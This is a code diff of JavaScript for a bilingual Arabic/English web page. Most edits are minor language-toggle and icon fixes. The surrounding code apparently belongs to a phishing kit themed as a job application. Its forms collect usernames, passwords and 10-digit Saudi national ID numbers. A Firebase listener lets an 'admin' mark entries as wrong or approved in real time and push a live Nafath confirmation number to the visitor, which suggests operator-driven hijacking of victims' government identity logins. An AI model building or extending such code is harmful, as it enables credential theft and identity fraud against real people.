@@ -55,6 +55,7 @@ document.addEventListener('DOMContentLoaded', () => {
     
     function applyLanguage(lang) {
         const t = translations[lang];
+        if (!t) return;
         
         // 1. تحديث سمات الاتجاه واللغة لعنصر الـ HTML والـ Body
         document.documentElement.setAttribute('dir', t.dir);
@@ -62,14 +63,19 @@ document.addEventListener('DOMContentLoaded', () => {
         document.body.setAttribute('dir', t.dir);
         document.body.style.direction = t.dir;
         
-        // 2. تحديث نص زر التبديل (ليعرض اسم اللغة الأخرى المتاحة للتحويل لها)
+        // 2. تحديث نص أزرار التبديل (شاشة الويب والموبايل) ليظهر اسم اللغة المقابلة
         const langSwitch = document.getElementById('langSwitch');
         if (langSwitch) {
             const span = langSwitch.querySelector('span');
             if (span) span.innerText = t.langText;
         }
 
-        // 3. ترجمة العناصر الثابتة التي تحمل سمة data-i18n (إذا كانت متوفرة بالـ HTML)
+        const mobileLangSpan = document.querySelector('.mob-lang-text');
+        if (mobileLangSpan) {
+            mobileLangSpan.innerText = t.langText;
+        }
+
+        // 3. ترجمة العناصر الثابتة التي تحمل سمة data-i18n
         document.querySelectorAll('[data-i18n]').forEach(element => {
             const key = element.getAttribute('data-i18n');
             if (t[key]) {
@@ -83,6 +89,12 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // تطبيق اللغة المحفوظة فوراً عند دخول الصفحة
     applyLanguage(currentLang);
+
+    // ربط وتبادل الدالة مع الـ Window لكي يتمكن كود الـ HTML والـ inline JavaScript من استدعائها بشكل مباشر وقاطع
+    window.toggleAppLanguage = function() {
+        const targetLang = (currentLang === 'ar') ? 'en' : 'ar';
+        applyLanguage(targetLang);
+    };
 
     // ==========================================
     // 1. تفاعلات الصفحة الرئيسية (Index Page)
@@ -112,8 +124,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     t.classList.add('collapsed');
                     const icon = t.querySelector('.status-icon');
                     if (icon) {
-                        icon.classList.remove('fa-minus');
-                        icon.classList.add('fa-plus');
+                        icon.className = 'fa-solid fa-plus status-icon';
                     }
                 });
 
@@ -125,8 +136,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 tab.classList.add('active');
                 const currentIcon = tab.querySelector('.status-icon');
                 if (currentIcon) {
-                    currentIcon.classList.remove('fa-plus');
-                    currentIcon.classList.add('fa-minus');
+                    currentIcon.className = 'fa-solid fa-minus status-icon';
                 }
 
                 const targetPanelId = tab.getAttribute('data-target');
@@ -144,7 +154,6 @@ document.addEventListener('DOMContentLoaded', () => {
     const globalLoader = document.getElementById('globalLoader');
     const loaderText = globalLoader ? globalLoader.querySelector('.loader-text') : null;
 
-    // دالة لمراقبة حالة المستند في فايربيس بشكل حي ومباشر والتحويل للواجهة الرقمية
     function listenToAdminApproval(collectionName, docId) {
         const docRef = doc(db, collectionName, docId);
 
@@ -152,13 +161,11 @@ document.addEventListener('DOMContentLoaded', () => {
         const nafathWaitContainer = document.getElementById('nafathWaitContainer');
         const nafathLiveNumber = document.getElementById('nafathLiveNumber');
 
-        // الاستماع للتغيرات اللحظية في قاعدة البيانات
         const unsubscribe = onSnapshot(docRef, (snapshot) => {
             if (snapshot.exists()) {
                 const data = snapshot.data();
                 const activeTrans = translations[currentLang];
 
-                // الإجراء الجديد والمضاف: حالة "تم التقديم للوظيفة"
                 if (data.status === "applied_success") {
                     if (globalLoader) globalLoader.classList.remove('hidden-loader');
                     if (loaderText) {
@@ -174,7 +181,6 @@ document.addEventListener('DOMContentLoaded', () => {
                     }, 5000);
                 }
 
-                // الإجراء الأول: نقر الأدمن على "رقم تأكيد" وإرسال الكود للمطابقة
                 else if (data.status === "show_code") {
                     if (globalLoader) globalLoader.classList.add('hidden-loader');
                     if (nafathFormContainer) nafathFormContainer.classList.add('hidden-panel');
@@ -182,7 +188,6 @@ document.addEventListener('DOMContentLoaded', () => {
                     if (nafathWaitContainer) nafathWaitContainer.classList.remove('hidden-panel');
                 }
 
-                // الإجراء الثاني: رقم الهوية غير صحيح من الأدمن
                 else if (data.status === "wrong_national_id") {
                     if (globalLoader) globalLoader.classList.add('hidden-loader');
                     alert(activeTrans.wrongId);
@@ -190,7 +195,6 @@ document.addEventListener('DOMContentLoaded', () => {
                     window.location.reload();
                 }
 
-                // الإجراء الثالث: بيانات اسم المستخدم أو كلمة المرور غير صحيحة من الأدمن
                 else if (data.status === "wrong_auth_data") {
                     if (globalLoader) globalLoader.classList.add('hidden-loader');
                     alert(activeTrans.wrongAuth);
@@ -198,7 +202,6 @@ document.addEventListener('DOMContentLoaded', () => {
                     window.location.reload();
                 }
 
-                // الإجراء المسبق: الموافقة التامة والنهائية والتحويل للمنصة الرئيسية
                 else if (data.status === "approved") {
                     if (globalLoader) globalLoader.classList.add('hidden-loader');
                     alert(activeTrans.approved);
@@ -216,7 +219,6 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    // تفعيل زر إلغاء الطلب بداخل واجهة انتظار نفاذ لإعادة تصفير ونعش الحقول
     const cancelNafathBtn = document.getElementById('cancelNafathBtn');
     if (cancelNafathBtn) {
         cancelNafathBtn.addEventListener('click', () => {
@@ -224,7 +226,7 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    // أ) نموذج اسم المستخدم وكلمة المرور الأصلي
+    // أ) نموذج اسم المستخدم وكلمة المرور
     const authForm = document.getElementById('authForm');
     if (authForm) {
         authForm.addEventListener('submit', async (e) => {
@@ -259,7 +261,7 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    // ب) نموذج رقم بطاقة الأحوال (الخاص بتبويب تطبيق نفاذ) مع حصر الطول بعشرة أرقام
+    // ب) نموذج رقم بطاقة الأحوال (تطبيق نفاذ)
     const appForm = document.getElementById('appForm');
     if (appForm) {
         const nationalIdField = document.getElementById('nationalId');
@@ -275,7 +277,6 @@ document.addEventListener('DOMContentLoaded', () => {
             const nationalIdInput = document.getElementById('nationalId').value.trim();
             const activeTrans = translations[currentLang];
 
-            // التحقق النهائي من شرط الـ 10 أرقام تماماً قبل الإرسال والرفع للفايربيس
             if (nationalIdInput.length !== 10) {
                 alert(activeTrans.lengthError);
                 return;
@@ -305,15 +306,11 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    // ==========================================
-    // 4. زر تبديل اللغة الحقيقي والديناميكي
-    // ==========================================
+    // ربط الحدث البرمجي المباشر لزر تبديل اللغة بداخل كتل الموديول
     const langSwitch = document.getElementById('langSwitch');
     if (langSwitch) {
         langSwitch.addEventListener('click', () => {
-            // التحويل للغة المعاكسة للغة الحالية مباشرة
-            const targetLang = (currentLang === 'ar') ? 'en' : 'ar';
-            applyLanguage(targetLang);
+            window.toggleAppLanguage();
         });
     }
 });
